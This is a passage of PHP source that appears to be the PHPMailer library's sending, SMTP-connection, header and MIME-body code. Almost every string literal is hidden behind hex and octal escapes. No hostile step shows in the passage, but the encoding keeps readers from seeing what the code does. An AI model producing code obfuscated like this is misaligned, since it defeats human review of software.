"\x20\124\x6f\x20\146\x69\x78\x20\x69\164\54\40\163\167\151\164\143\x68\40\164\157\40\163\145\156\144\151\x6e\147\40\165\x73\151\156\x67\40\123\x4d\124\x50\54\x20\x64\x69\x73\x61\x62\x6c\145\40\164\150\x65\40\x6d\141\x69\x6c\56\141\144\144\x5f\170\x5f\x68\145\x61\144\x65\162\40\x6f\x70\164\151\157\x6e\x20\151\156" . "\40\171\x6f\x75\x72\x20\x70\x68\x70\56\x69\156\151\54\x20\x73\167\x69\164\143\150\x20\164\157\40\x4d\x61\143\x4f\x53\40\x6f\x72\x20\114\x69\x6e\165\170\54\40\157\162\x20\x75\160\147\162\141\x64\145\x20\171\x6f\x75\162\x20\x50\x48\120\x20\x74\157\40\x76\145\162\x73\x69\157\x6e\x20\x37\56\60\56\x31\67\53\40\x6f\162\x20\67\56\61\x2e\x33\x2b\x2e", E_USER_WARNING); } try { $this->error_count = 0; $this->mailHeader = ''; foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $params) { $params[1] = $this->punyencodeAddress($params[1]); call_user_func_array(array($this, "\x61\144\144\x41\156\x41\144\x64\162\145\x73\x73"), $params); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new Exception($this->lang("\160\x72\x6f\x76\151\x64\145\x5f\x61\144\144\162\145\x73\163"), self::STOP_CRITICAL); } foreach (array("\x46\x72\157\x6d", "\123\x65\156\144\145\162", "\x43\x6f\156\146\x69\x72\155\x52\x65\x61\144\x69\x6e\147\124\157") as $address_kind) { $this->{$address_kind} = trim($this->{$address_kind}); if (empty($this->{$address_kind})) { continue; } $this->{$address_kind} = $this->punyencodeAddress($this->{$address_kind}); if (!static::validateAddress($this->{$address_kind})) { $error_message = sprintf("\45\163\x20\x28\x25\163\x29\x3a\40\45\x73", $this->lang("\151\156\x76\141\154\151\x64\x5f\141\x64\144\162\x65\163\163"), $address_kind, $this->{$address_kind}); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } } if ($this->alternativeExists()) { $this->ContentType = static::CONTENT_TYPE_MULTIPART_ALTERNATIVE; } $this->setMessageType(); if (!$this->AllowEmpty and empty($this->Body)) { throw new Exception($this->lang("\145\x6d\x70\164\171\137\x6d\145\x73\163\141\x67\145"), self::STOP_CRITICAL); } $this->Subject = trim($this->Subject); $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $tempheaders = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $tempheaders; if ("\155\141\x69\154" == $this->Mailer) { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend("\124\157", $this->to); } else { $this->mailHeader .= $this->headerLine("\x54\x6f", "\x75\x6e\x64\x69\163\143\x6c\x6f\x73\145\x64\55\162\145\x63\x69\160\151\x65\x6e\x74\x73\72\x3b"); } $this->mailHeader .= $this->headerLine("\x53\x75\x62\152\x65\143\x74", $this->encodeHeader($this->secureHeader($this->Subject))); } if (!empty($this->DKIM_domain) and !empty($this->DKIM_selector) and (!empty($this->DKIM_private_string) or !empty($this->DKIM_private) and static::isPermittedPath($this->DKIM_private) and file_exists($this->DKIM_private))) { $header_dkim = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = rtrim($this->MIMEHeader, "\15\xa\x20") . static::$LE . static::normalizeBreaks($header_dkim) . static::$LE; } return true; } catch (Exception $exc) { $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function postSend() { try { switch ($this->Mailer) { case "\163\x65\x6e\x64\155\141\151\154": case "\161\155\x61\x69\x6c": return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case "\163\x6d\164\160": return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case "\155\141\151\154": return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $sendMethod = $this->Mailer . "\123\145\156\144"; if (method_exists($this, $sendMethod)) { return $this->{$sendMethod}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } } return false; } protected function sendmailSend($header, $body) { if (!empty($this->Sender) and self::isShellSafe($this->Sender)) { if ("\x71\x6d\141\151\154" == $this->Mailer) { $sendmailFmt = "\x25\x73\x20\x2d\x66\45\x73"; } else { $sendmailFmt = "\x25\x73\x20\x2d\x6f\x69\40\x2d\146\45\163\x20\x2d\x74"; } } else { if ("\161\155\x61\x69\x6c" == $this->Mailer) { $sendmailFmt = "\x25\163"; } else { $sendmailFmt = "\45\163\x20\x2d\x6f\x69\x20\55\164"; } } $sendmail = sprintf($sendmailFmt, escapeshellcmd($this->Sendmail), $this->Sender); if ($this->SingleTo) { foreach ($this->SingleToArray as $toAddr) { $mail = @popen($sendmail, "\167"); if (!$mail) { throw new Exception($this->lang("\x65\x78\x65\143\165\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } fwrite($mail, "\x54\x6f\x3a\40" . $toAddr . "\xa"); fwrite($mail, $header); fwrite($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); if (0 !== $result) { throw new Exception($this->lang("\145\x78\x65\x63\x75\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } } } else { $mail = @popen($sendmail, "\x77"); if (!$mail) { throw new Exception($this->lang("\x65\170\145\143\x75\164\145") . $this->Sendmail, self::STOP_CRITICAL); } fwrite($mail, $header); fwrite($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); if (0 !== $result) { throw new Exception($this->lang("\145\x78\145\x63\165\164\145") . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($string) { if (escapeshellcmd($string) !== $string or !in_array(escapeshellarg($string), array("\x27{$string}\x27", "\42{$string}\42"))) { return false; } $length = strlen($string); for ($i = 0; $i < $length; ++$i) { $c = $string[$i]; if (!ctype_alnum($c) && strpos("\x40\x5f\x2d\x2e", $c) === false) { return false; } } return true; } protected static function isPermittedPath($path) { return !preg_match("\x23\136\133\x61\x2d\x7a\x5d\x2b\72\57\x2f\43\151", $path); } protected function mailSend($header, $body) { $toArr = array(); foreach ($this->to as $toaddr) { $toArr[] = $this->addrFormat($toaddr); } $to = implode("\x2c\x20", $toArr); $params = null; if (!empty($this->Sender) and static::validateAddress($this->Sender)) { if (self::isShellSafe($this->Sender)) { $params = sprintf("\55\x66\x25\163", $this->Sender); } } if (!empty($this->Sender) and static::validateAddress($this->Sender)) { $old_from = ini_get("\163\145\156\x64\155\141\151\154\137\x66\162\x6f\x6d"); ini_set("\x73\145\x6e\144\x6d\141\x69\154\137\146\x72\157\155", $this->Sender); } $result = false; if ($this->SingleTo and count($toArr) > 1) { foreach ($toArr as $toAddr) { $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params); $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); } } else { $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params); $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); } if (isset($old_from)) { ini_set("\x73\145\156\x64\x6d\x61\151\x6c\137\x66\162\x6f\155", $old_from); } if (!$result) { throw new Exception($this->lang("\x69\x6e\163\x74\141\x6e\164\x69\141\164\145"), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new SMTP(); } return $this->smtp; } public function setSMTPInstance(SMTP $smtp) { $this->smtp = $smtp; return $this->smtp; } protected function smtpSend($header, $body) { $bad_rcpt = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new Exception($this->lang("\163\155\164\160\x5f\x63\x6f\x6e\x6e\145\143\x74\137\146\x61\151\154\x65\144"), self::STOP_CRITICAL); } if ('' == $this->Sender) { $smtp_from = $this->From; } else { $smtp_from = $this->Sender; } if (!$this->smtp->mail($smtp_from)) { $this->setError($this->lang("\x66\162\157\x6d\x5f\x66\x61\x69\154\x65\x64") . $smtp_from . "\x20\72\x20" . implode("\54", $this->smtp->getError())); throw new Exception($this->ErrorInfo, self::STOP_CRITICAL); } $callbacks = array(); foreach (array($this->to, $this->cc, $this->bcc) as $togroup) { foreach ($togroup as $to) { if (!$this->smtp->recipient($to[0], $this->dsn)) { $error = $this->smtp->getError(); $bad_rcpt[] = array("\x74\157" => $to[0], "\145\162\162\157\162" => $error["\144\x65\x74\x61\x69\x6c"]); $isSent = false; } else { $isSent = true; } $callbacks[] = array("\x69\163\x73\x65\156\x74" => $isSent, "\164\x6f" => $to[0]); } } if (count($this->all_recipients) > count($bad_rcpt) and !$this->smtp->data($header . $body)) { throw new Exception($this->lang("\x64\x61\x74\141\137\156\157\164\x5f\141\143\143\145\160\x74\145\144"), self::STOP_CRITICAL); } $smtp_transaction_id = $this->smtp->getLastTransactionID(); if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } foreach ($callbacks as $cb) { $this->doCallback($cb["\x69\163\x73\x65\x6e\x74"], array($cb["\164\157"]), array(), array(), $this->Subject, $body, $this->From, array("\163\x6d\x74\x70\137\x74\x72\141\156\x73\x61\x63\x74\151\157\x6e\x5f\151\x64" => $smtp_transaction_id)); } if (count($bad_rcpt) > 0) { $errstr = ''; foreach ($bad_rcpt as $bad) { $errstr .= $bad["\164\x6f"] . "\72\40" . $bad["\x65\162\x72\x6f\162"]; } throw new Exception($this->lang("\x72\145\x63\151\x70\x69\x65\156\x74\163\x5f\x66\141\x69\x6c\x65\144") . $errstr, self::STOP_CONTINUE); } return true; } public function smtpConnect($options = null) { if (null === $this->smtp) { $this->smtp = $this->getSMTPInstance(); } if (null === $options) { $options = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $hosts = explode("\73", $this->Host); $lastexception = null; foreach ($hosts as $hostentry) { $hostinfo = array(); if (!preg_match("\x2f\136\x28\x28\163\163\154\x7c\164\154\x73\51\x3a\134\57\x5c\x2f\x29\52\50\133\x61\55\x7a\x41\55\x5a\x30\x2d\x39\x5c\56\55\135\x2a\174\134\x5b\133\141\x2d\x66\101\55\x46\x30\55\71\72\135\x2b\134\135\x29\x3a\x3f\50\x5b\x30\55\x39\x5d\52\x29\44\x2f", trim($hostentry), $hostinfo)) { static::edebug($this->lang("\143\157\x6e\156\x65\x63\x74\137\150\x6f\163\x74") . "\40" . $hostentry); continue; } if (!static::isValidHost($hostinfo[3])) { static::edebug($this->lang("\143\x6f\156\156\145\143\164\x5f\150\x6f\x73\164") . "\40" . $hostentry); continue; } $prefix = ''; $secure = $this->SMTPSecure; $tls = "\164\154\163" == $this->SMTPSecure; if ("\163\163\154" == $hostinfo[2] or '' == $hostinfo[2] and "\163\x73\154" == $this->SMTPSecure) { $prefix = "\163\163\154\x3a\57\57"; $tls = false; $secure = "\163\x73\154"; } elseif ("\164\x6c\163" == $hostinfo[2]) { $tls = true; $secure = "\x74\x6c\163"; } $sslext = defined("\x4f\x50\105\x4e\x53\123\x4c\137\101\114\x47\117\137\x53\110\101\62\x35\66"); if ("\x74\x6c\163" === $secure or "\x73\x73\x6c" === $secure) { if (!$sslext) { throw new Exception($this->lang("\145\x78\x74\145\x6e\x73\151\x6f\x6e\x5f\155\151\x73\x73\x69\156\147") . "\157\x70\x65\156\x73\x73\x6c", self::STOP_CRITICAL); } } $host = $hostinfo[3]; $port = $this->Port; $tport = (int) $hostinfo[4]; if ($tport > 0 and $tport < 65536) { $port = $tport; } if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) { try { if ($this->Helo) { $hello = $this->Helo; } else { $hello = $this->serverHostname(); } $this->smtp->hello($hello); if ($this->SMTPAutoTLS and $sslext and "\163\163\x6c" != $secure and $this->smtp->getServerExt("\123\x54\x41\122\124\x54\x4c\123")) { $tls = true; } if ($tls) { if (!$this->smtp->startTLS()) { throw new Exception($this->lang("\x63\157\x6e\156\145\x63\x74\x5f\x68\157\x73\164")); } $this->smtp->hello($hello); } if ($this->SMTPAuth) { if (!$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->oauth)) { throw new Exception($this->lang("\x61\165\x74\150\x65\x6e\x74\x69\143\x61\164\x65")); } } return true; } catch (Exception $exc) { $lastexception = $exc; $this->edebug($exc->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions and null !== $lastexception) { throw $lastexception; } return false; } public function smtpClose() { if (null !== $this->smtp) { if ($this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } } public function setLanguage($langcode = "\x65\156", $lang_path = '') { $renamed_langcodes = array("\x62\x72" => "\160\x74\137\x62\x72", "\x63\x7a" => "\143\x73", "\x64\x6b" => "\144\x61", "\156\x6f" => "\156\x62", "\x73\x65" => "\x73\x76", "\x72\x73" => "\163\x72", "\164\147" => "\164\154"); if (isset($renamed_langcodes[$langcode])) { $langcode = $renamed_langcodes[$langcode]; } $PHPMAILER_LANG = array("\141\165\x74\x68\145\156\x74\x69\143\141\164\x65" => "\123\x4d\124\x50\x20\x45\x72\162\157\162\x3a\x20\103\x6f\x75\x6c\144\40\x6e\157\x74\x20\x61\x75\x74\150\x65\x6e\164\151\143\141\x74\x65\x2e", "\143\157\x6e\156\145\x63\164\137\x68\157\163\x74" => "\123\x4d\124\x50\40\x45\x72\162\x6f\x72\72\40\x43\x6f\165\154\x64\x20\x6e\157\x74\x20\143\x6f\x6e\156\x65\x63\x74\40\x74\157\40\x53\x4d\x54\x50\40\150\157\163\164\x2e", "\144\141\164\141\x5f\156\x6f\164\137\141\x63\x63\x65\x70\x74\145\x64" => "\123\115\x54\120\40\105\162\x72\157\162\x3a\40\x64\x61\164\x61\40\156\x6f\x74\x20\141\143\143\x65\x70\164\x65\x64\x2e", "\145\155\160\164\171\137\x6d\145\163\x73\x61\147\145" => "\x4d\x65\163\x73\x61\147\x65\x20\142\x6f\144\171\x20\145\155\160\x74\x79", "\145\x6e\x63\x6f\x64\151\x6e\147" => "\x55\156\x6b\156\157\167\x6e\40\x65\x6e\143\157\144\151\x6e\x67\x3a\40", "\145\170\145\143\x75\164\x65" => "\103\157\x75\x6c\x64\x20\156\x6f\164\40\145\170\145\143\x75\x74\145\x3a\x20", "\146\x69\x6c\x65\x5f\141\143\x63\x65\163\x73" => "\x43\x6f\165\x6c\x64\40\x6e\157\164\40\141\143\x63\145\163\x73\40\146\151\154\145\72\40", "\x66\151\154\x65\x5f\x6f\x70\x65\x6e" => "\x46\x69\x6c\145\40\105\x72\162\x6f\162\72\x20\103\x6f\x75\x6c\x64\40\156\x6f\164\40\x6f\160\x65\156\x20\146\151\154\x65\x3a\x20", "\x66\162\157\155\x5f\146\x61\151\154\x65\144" => "\x54\150\x65\40\x66\x6f\154\154\157\167\x69\156\x67\x20\x46\x72\x6f\x6d\40\141\144\x64\x72\145\x73\163\x20\x66\x61\151\x6c\x65\x64\72\x20", "\x69\x6e\163\164\141\156\x74\x69\141\164\x65" => "\103\x6f\165\x6c\x64\x20\156\x6f\x74\x20\151\x6e\x73\x74\141\156\164\151\x61\164\145\x20\x6d\141\151\x6c\x20\x66\x75\x6e\x63\x74\x69\157\x6e\56", "\x69\x6e\x76\x61\154\151\x64\137\x61\x64\x64\162\x65\x73\x73" => "\x49\x6e\x76\141\x6c\151\x64\x20\x61\144\144\162\x65\163\163\x3a\x20", "\x6d\141\151\x6c\x65\x72\x5f\156\157\164\137\x73\x75\160\x70\x6f\x72\x74\x65\x64" => "\40\x6d\141\151\x6c\145\162\40\x69\x73\40\x6e\157\164\x20\x73\165\160\160\x6f\162\x74\145\x64\56", "\x70\x72\157\166\x69\144\x65\x5f\141\x64\x64\x72\145\163\x73" => "\x59\x6f\165\40\x6d\165\x73\x74\x20\160\162\157\x76\x69\144\145\40\141\x74\40\154\145\x61\x73\164\40\157\156\x65\40\x72\145\x63\151\160\x69\145\156\x74\x20\145\x6d\141\x69\154\x20\x61\x64\144\162\x65\163\163\56", "\162\x65\143\x69\160\x69\x65\156\x74\163\137\146\x61\x69\154\x65\144" => "\123\x4d\x54\120\x20\105\x72\x72\157\162\x3a\x20\124\150\145\x20\x66\157\154\x6c\x6f\167\151\x6e\x67\40\x72\x65\x63\151\160\x69\x65\156\x74\x73\40\x66\141\x69\154\x65\x64\72\x20", "\x73\x69\147\156\151\156\x67" => "\123\151\147\x6e\151\x6e\x67\x20\x45\x72\x72\157\x72\72\x20", "\x73\x6d\164\x70\137\143\x6f\x6e\156\145\x63\164\x5f\146\141\x69\x6c\x65\144" => "\x53\x4d\x54\x50\40\x63\157\156\x6e\x65\x63\x74\x28\51\x20\146\x61\151\x6c\x65\x64\56", "\x73\x6d\164\160\x5f\145\162\162\157\x72" => "\x53\115\x54\120\40\x73\145\x72\x76\145\162\x20\x65\x72\x72\157\x72\72\x20", "\x76\x61\x72\x69\141\142\154\145\137\x73\145\x74" => "\103\141\x6e\x6e\157\164\40\163\145\x74\40\157\162\40\x72\x65\x73\145\164\x20\x76\141\162\x69\141\142\x6c\145\72\40", "\x65\170\164\x65\156\163\151\157\x6e\137\x6d\x69\163\163\x69\156\147" => "\x45\170\164\145\156\163\x69\x6f\x6e\40\x6d\151\x73\x73\x69\x6e\147\72\x20"); if (empty($lang_path)) { $lang_path = dirname(__DIR__) . DIRECTORY_SEPARATOR . "\x6c\141\x6e\x67\x75\x61\147\x65" . DIRECTORY_SEPARATOR; } if (!preg_match("\57\136\x5b\141\55\x7a\135\x7b\x32\175\50\x3f\72\137\133\x61\55\172\101\55\x5a\x5d\x7b\62\175\51\77\44\57", $langcode)) { $langcode = "\x65\x6e"; } $foundlang = true; $lang_file = $lang_path . "\160\x68\x70\x6d\x61\x69\154\145\162\56\154\x61\x6e\147\55" . $langcode . "\x2e\160\x68\160"; if ("\x65\x6e" != $langcode) { if (!static::isPermittedPath($lang_file) || !file_exists($lang_file)) { $foundlang = false; } else { $foundlang = (include $lang_file); } } $this->language = $PHPMAILER_LANG; return (bool) $foundlang; } public function getTranslations() { return $this->language; } public function addrAppend($type, $addr) { $addresses = array(); foreach ($addr as $address) { $addresses[] = $this->addrFormat($address); } return $type . "\x3a\x20" . implode("\x2c\x20", $addresses) . static::$LE; } public function addrFormat($addr) { if (empty($addr[1])) { return $this->secureHeader($addr[0]); } return $this->encodeHeader($this->secureHeader($addr[1]), "\x70\150\x72\141\x73\x65") . "\x20\x3c" . $this->secureHeader($addr[0]) . "\76"; } public function wrapText($message, $length, $qp_mode = false) { if ($qp_mode) { $soft_break = sprintf("\40\75\x25\163", static::$LE); } else { $soft_break = static::$LE; } $is_utf8 = static::CHARSET_UTF8 === strtolower($this->CharSet); $lelen = strlen(static::$LE); $crlflen = strlen(static::$LE); $message = static::normalizeBreaks($message); if (substr($message, -$lelen) == static::$LE) { $message = substr($message, 0, -$lelen); } $lines = explode(static::$LE, $message); $message = ''; foreach ($lines as $line) { $words = explode("\40", $line); $buf = ''; $firstword = true; foreach ($words as $word) { if ($qp_mode and strlen($word) > $length) { $space_left = $length - strlen($buf) - $crlflen; if (!$firstword) { if ($space_left > 20) { $len = $space_left; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif ("\x3d" == substr($word, $len - 1, 1)) { --$len; } elseif ("\x3d" == substr($word, $len - 2, 1)) { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); $buf .= "\40" . $part; $message .= $buf . sprintf("\75\45\163", static::$LE); } else { $message .= $buf . $soft_break; } $buf = ''; } while (strlen($word) > 0) { if ($length <= 0) { break; } $len = $length; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif ("\75" == substr($word, $len - 1, 1)) { --$len; } elseif ("\x3d" == substr($word, $len - 2, 1)) { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); if (strlen($word) > 0) { $message .= $part . sprintf("\x3d\x25\163", static::$LE); } else { $buf = $part; } } } else { $buf_o = $buf; if (!$firstword) { $buf .= "\40"; } $buf .= $word; if (strlen($buf) > $length and '' != $buf_o) { $message .= $buf_o . $soft_break; $buf = $word; } } $firstword = false; } $message .= $buf . static::$LE; } return $message; } public function utf8CharBoundary($encodedText, $maxLength) { $foundSplitPos = false; $lookBack = 3; while (!$foundSplitPos) { $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack); $encodedCharPos = strpos($lastChunk, "\x3d"); if (false !== $encodedCharPos) { $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2); $dec = hexdec($hex); if ($dec < 128) { if ($encodedCharPos > 0) { $maxLength -= $lookBack - $encodedCharPos; } $foundSplitPos = true; } elseif ($dec >= 192) { $maxLength -= $lookBack - $encodedCharPos; $foundSplitPos = true; } elseif ($dec < 192) { $lookBack += 3; } } else { $foundSplitPos = true; } } return $maxLength; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case "\x61\x6c\x74": case "\141\x6c\x74\x5f\x69\156\x6c\x69\x6e\145": case "\141\x6c\x74\137\141\x74\x74\x61\143\x68": case "\x61\x6c\164\x5f\151\156\x6c\x69\156\145\x5f\141\164\164\x61\x63\150": $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $result = ''; $result .= $this->headerLine("\x44\141\164\145", '' == $this->MessageDate ? self::rfcDate() : $this->MessageDate); if ($this->SingleTo) { if ("\x6d\141\x69\x6c" != $this->Mailer) { foreach ($this->to as $toaddr) { $this->SingleToArray[] = $this->addrFormat($toaddr); } } } else { if (count($this->to) > 0) { if ("\155\141\151\154" != $this->Mailer) { $result .= $this->addrAppend("\x54\157", $this->to); } } elseif (count($this->cc) == 0) { $result .= $this->headerLine("\x54\x6f", "\165\x6e\x64\151\x73\143\154\157\x73\145\x64\x2d\162\x65\143\x69\160\x69\x65\156\x74\x73\x3a\73"); } } $result .= $this->addrAppend("\106\x72\157\155", array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $result .= $this->addrAppend("\103\x63", $this->cc); } if (("\x73\x65\x6e\144\155\141\151\x6c" == $this->Mailer or "\161\155\141\151\x6c" == $this->Mailer or "\155\x61\x69\x6c" == $this->Mailer) and count($this->bcc) > 0) { $result .= $this->addrAppend("\x42\x63\143", $this->bcc); } if (count($this->ReplyTo) > 0) { $result .= $this->addrAppend("\x52\145\160\154\171\55\x54\x6f", $this->ReplyTo); } if ("\155\x61\x69\154" != $this->Mailer) { $result .= $this->headerLine("\123\x75\142\x6a\145\143\164", $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' != $this->MessageID and preg_match("\x2f\x5e\x3c\56\52\x40\56\52\76\x24\x2f", $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf("\x3c\45\x73\x40\x25\x73\76", $this->uniqueid, $this->serverHostname()); } $result .= $this->headerLine("\115\x65\163\163\141\147\145\55\111\104", $this->lastMessageID); if (null !== $this->Priority) { $result .= $this->headerLine("\130\x2d\x50\x72\151\157\162\x69\164\171", $this->Priority); } if ('' == $this->XMailer) { $result .= $this->headerLine("\130\x2d\115\x61\151\x6c\145\162", "\x50\x48\x50\115\x61\x69\154\x65\162\40" . self::VERSION); } else { $myXmailer = trim($this->XMailer); if ($myXmailer) { $result .= $this->headerLine("\x58\x2d\x4d\x61\x69\154\x65\x72", $myXmailer); } } if ('' != $this->ConfirmReadingTo) { $result .= $this->headerLine("\104\x69\x73\160\x6f\163\151\164\151\157\156\55\116\x6f\x74\x69\146\x69\143\141\x74\151\157\x6e\55\x54\x6f", "\x3c" . $this->ConfirmReadingTo . "\x3e"); } foreach ($this->CustomHeader as $header) { $result .= $this->headerLine(trim($header[0]), $this->encodeHeader(trim($header[1]))); } if (!$this->sign_key_file) { $result .= $this->headerLine("\x4d\111\115\x45\x2d\126\x65\162\163\151\x6f\156", "\61\x2e\x30"); $result .= $this->getMailMIME(); } return $result; } public function getMailMIME() { $result = ''; $ismultipart = true; switch ($this->message_type) { case "\151\156\154\x69\x6e\x65": $result .= $this->headerLine("\x43\x6f\156\164\145\x6e\x74\55\x54\171\x70\145", static::CONTENT_TYPE_MULTIPART_RELATED . "\x3b"); $result .= $this->textLine("\x9\142\x6f\165\156\144\141\x72\171\75\42" . $this->boundary[1] . "\42"); break; case "\x61\x74\164\141\x63\150": case "\x69\156\x6c\151\x6e\145\x5f\x61\164\x74\x61\143\x68": case "\x61\x6c\x74\137\141\164\164\141\x63\x68": case "\x61\x6c\164\137\x69\x6e\154\151\x6e\145\137\141\x74\x74\141\x63\150": $result .= $this->headerLine("\103\157\x6e\164\x65\x6e\164\x2d\124\x79\160\145", static::CONTENT_TYPE_MULTIPART_MIXED . "\x3b"); $result .= $this->textLine("\11\142\x6f\x75\x6e\144\x61\x72\171\x3d\x22" . $this->boundary[1] . "\42"); break; case "\x61\154\x74": case "\141\154\x74\137\151\156\154\x69\x6e\x65": $result .= $this->headerLine("\103\x6f\x6e\x74\145\156\x74\55\x54\x79\160\145", static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . "\x3b"); $result .= $this->textLine("\11\x62\157\165\156\144\141\x72\171\x3d\x22" . $this->boundary[1] . "\42"); break; default: $result .= $this->textLine("\103\x6f\156\x74\x65\156\164\55\124\171\x70\145\x3a\x20" . $this->ContentType . "\73\40\x63\150\141\x72\x73\145\x74\x3d" . $this->CharSet); $ismultipart = false; break; } if (static::ENCODING_7BIT != $this->Encoding) { if ($ismultipart) { if (static::ENCODING_8BIT == $this->Encoding) { $result .= $this->headerLine("\103\x6f\156\164\x65\156\x74\55\x54\162\141\156\x73\146\145\162\55\105\x6e\x63\x6f\144\151\156\x67", static::ENCODING_8BIT); } } else { $result .= $this->headerLine("\x43\157\156\164\145\156\164\x2d\124\x72\x61\156\x73\146\x65\162\x2d\x45\x6e\143\x6f\144\x69\156\147", $this->Encoding); } } if ("\x6d\x61\151\x6c" != $this->Mailer) { $result .= static::$LE; } return $result; } public function getSentMIMEMessage() { return rtrim($this->MIMEHeader . $this->mailHeader, "\xa\xd") . static::$LE . static::$LE . $this->MIMEBody; } protected function generateId() { $len = 32; if (function_exists("\x72\141\x6e\x64\157\155\137\142\171\164\x65\x73")) { $bytes = random_bytes($len); } elseif (function_exists("\157\x70\145\156\163\163\x6c\x5f\x72\x61\156\x64\x6f\155\137\160\163\x65\x75\x64\x6f\137\142\x79\x74\145\163")) { $bytes = openssl_random_pseudo_bytes($len); } else { $bytes = hash("\163\150\141\x32\65\x36", uniqid((string) mt_rand(), true), true); } return str_replace(array("\75", "\53", "\57"), '', base64_encode(hash("\163\150\141\x32\x35\66", $bytes, true))); } public function createBody() { $body = ''; $this->uniqueid = $this->generateId(); $this->boundary[1] = "\x62\x31\x5f" . $this->uniqueid; $this->boundary[2] = "\142\62\137" . $this->uniqueid; $this->boundary[3] = "\x62\63\137" . $this->uniqueid; if ($this->sign_key_file) { $body .= $this->getMailMIME() . static::$LE; } $this->setWordWrap(); $bodyEncoding = $this->Encoding; $bodyCharSet = $this->CharSet; if (static::ENCODING_8BIT == $bodyEncoding and !$this->has8bitChars($this->Body)) { $bodyEncoding = static::ENCODING_7BIT; $bodyCharSet = "\x75\163\x2d\x61\x73\x63\151\x69"; } if (static::ENCODING_BASE64 != $this->Encoding and static::hasLineLongerThanMax($this->Body)) { $bodyEncoding = static::ENCODING_QUOTED_PRINTABLE; } $altBodyEncoding = $this->Encoding; $altBodyCharSet = $this->CharSet; if (static::ENCODING_8BIT == $altBodyEncoding and !$this->has8bitChars($this->AltBody)) { $altBodyEncoding = static::ENCODING_7BIT; $altBodyCharSet = "\x75\x73\x2d\x61\163\x63\x69\151"; } if (static::ENCODING_BASE64 != $altBodyEncoding and static::hasLineLongerThanMax($this->AltBody)) { $altBodyEncoding = static::ENCODING_QUOTED_PRINTABLE; } $mimepre = "\124\150\x69\x73\40\x69\x73\40\141\40\155\x75\154\x74\x69\x2d\x70\x61\x72\164\40\155\x65\163\163\141\147\145\x20\x69\156\40\115\x49\115\x45\40\146\x6f\162\x6d\x61\x74\x2e" . static::$LE; switch ($this->message_type) { case "\x69\156\x6c\151\156\x65": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\151\156\x6c\151\x6e\x65", $this->boundary[1]); break; case "\x61\x74\164\x61\143\x68": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\x61\164\164\x61\143\x68\x6d\x65\156\x74", $this->boundary[1]); break; case "\x69\x6e\x6c\151\156\145\137\141\x74\164\x61\143\x68": $body .= $mimepre; $body .= $this->textLine("\x2d\x2d" . $this->boundary[1]); $body .= $this->headerLine("\x43\157\x6e\x74\145\156\164\55\x54\x79\160\x65", static::CONTENT_TYPE_MULTIPART_RELATED . "\73"); $body .= $this->textLine("\x9\142\157\x75\156\x64\141\162\171\x3d\42" . $this->boundary[2] . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= 